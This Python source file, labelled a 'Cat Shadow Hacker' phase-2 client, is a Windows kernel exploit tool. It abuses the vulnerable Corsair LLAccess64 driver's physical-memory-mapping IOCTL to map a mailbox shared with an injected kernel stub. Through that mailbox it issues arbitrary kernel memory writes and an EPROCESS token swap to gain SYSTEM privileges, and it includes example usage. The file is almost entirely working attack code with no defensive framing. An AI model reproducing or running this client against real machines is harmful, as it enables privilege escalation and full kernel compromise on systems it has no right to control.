import ctypes
import struct
import time
import sys

# CAT SHADOW HACKER - PHASE 2 CLIENT
# MISSION: COMMAND AND CONTROL FOR THE NANDO KERNEL DISPATCHER

class NandoClient:
    def __init__(self, mailbox_pa=0x100711F00):
        self.IOCTL_MAP_PHYS_MEM = 0x00225374
        self.PAGE_SIZE = 0x1000
        self.MAILBOX_PA = mailbox_pa
        
        # Offsets
        self.OFF_CMD = 0x00
        self.OFF_STATUS = 0x04
        self.OFF_ARG1 = 0x10
        self.OFF_ARG2 = 0x18
        self.OFF_RESULT = 0x20
        self.OFF_HEARTBEAT = 0x30
        
        self.kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        self.h_driver = None
        self.mailbox_va = None

    def connect(self):
        self.h_driver = self.kernel32.CreateFileW(
            r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None
        )
        if self.h_driver == -1:
            raise Exception("[-] Failed to open Corsair driver")
        
        # Map mailbox
        pa_base = self.MAILBOX_PA & ~0xFFF
        inp = struct.pack("<QII", pa_base, self.PAGE_SIZE, 0)
        out = ctypes.c_uint64(0)
        ret = ctypes.c_uint32(0)
        ok = self.kernel32.DeviceIoControl(
            self.h_driver, self.IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None
        )
        if not ok or not out.value:
            raise Exception("[-] Failed to map mailbox")
        
        self.mailbox_va = out.value + (self.MAILBOX_PA & 0xFFF)
        print(f"[+] Connected to Nando Kernel. Mailbox VA: 0x{self.mailbox_va:X}")

    def read_heartbeat(self):
        val = ctypes.c_ubyte.from_address(self.mailbox_va + self.OFF_HEARTBEAT).value
        return val

    def send_command(self, cmd_id, arg1=0, arg2=0, timeout=1.0):
        # 1. Clear status
        ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_STATUS).value = 1 # Busy/Wait
        
        # 2. Write arguments
        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG1).value = arg1
        ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_ARG2).value = arg2
        
        # 3. Write command ID
        ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_CMD).value = cmd_id
        
        # 4. Wait for completion (stub clears Cmd ID)
        start = time.time()
        while time.time() - start < timeout:
            if ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_CMD).value == 0:
                status = ctypes.c_uint32.from_address(self.mailbox_va + self.OFF_STATUS).value
                result = ctypes.c_uint64.from_address(self.mailbox_va + self.OFF_RESULT).value
                return status, result
            time.sleep(0.01)
            
        raise Exception("[-] Command timed out")

    def write_virtual(self, target_kva, value):
        """
        Uses Command 0x02 in the kernel stub to perform a virtual memory write.
        target_kva: The KVA of the memory to write to.
        value: The 64-bit value to write.
        """
        print(f"[*] Executing Write Virtual Command (Kernel Side)...")
        print(f"[*] Target KVA: 0x{target_kva:X}")
        print(f"[*] Value: 0x{value:X}")
        
        status, _ = self.send_command(2, target_kva, value)
        if status == 0:
            print("[+] Kernel command SUCCESS!")
        else:
            print(f"[-] Kernel command FAILED with status: {status}")

    def perform_token_swap(self, target_kva, system_token):
        """
        Uses Command 0x03 in the kernel stub to perform a token swap.
        target_kva: The KVA of the token field in the target process's EPROCESS.
        system_token: The token value to write.
        """
        print(f"[*] Executing Token Swap Command (Kernel Side)...")
        print(f"[*] Target KVA: 0x{target_kva:X}")
        print(f"[*] System Token: 0x{system_token:X}")
        
        status, _ = self.send_command(3, target_kva, system_token)
        if status == 0:
            print("[+] Kernel command SUCCESS!")
        else:
            print(f"[-] Kernel command FAILED with status: {status}")

if __name__ == "__main__":
    # Example Usage
    client = NandoClient()
    try:
        client.connect()
        
        hb = client.read_heartbeat()
        print(f"[*] Current Heartbeat: 0x{hb:X}")
        if hb != 0x77:
            print("[-] Heartbeat check failed! Is the stub injected?")
            sys.exit(1)
            
        # These values would come from our previous diagnostics (surgical_swap_fresh.py)
        # Note: We need a KVA for the kernel stub to work. 
        # In a real scenario, we'd use find_kernel_exports.py to get MmMapIoSpace
        # and then we could pass a Physical Address. 
        # For now, this demo assumes we have a KVA.
        
        # TARGET_TOKEN_KVA = 0x...
        # SYSTEM_TOKEN = 0xFFFFB2866026D953
        # client.perform_token_swap(TARGET_TOKEN_KVA, SYSTEM_TOKEN)
        
    except Exception as e:
        print(f"[-] Error: {e}")
